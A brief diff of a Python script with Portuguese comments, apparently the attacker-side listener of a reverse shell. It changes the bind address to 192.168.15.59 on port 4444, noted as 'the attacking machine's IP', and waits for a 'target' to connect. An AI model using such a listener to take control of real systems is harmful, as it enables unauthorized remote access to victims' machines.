@@ -86,7 +86,7 @@ def t_commun():
 
 #Conectar ao IP
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('10.0.2.15', 444)) #Coloque o IP da máquina atacante aqui
+sock.bind(('192.168.15.59', 4444)) #Coloque o IP da máquina atacante aqui
 print(colored('[-] Wating for connections', 'green'))
 sock.listen(5)
 target, ip = sock.accept()
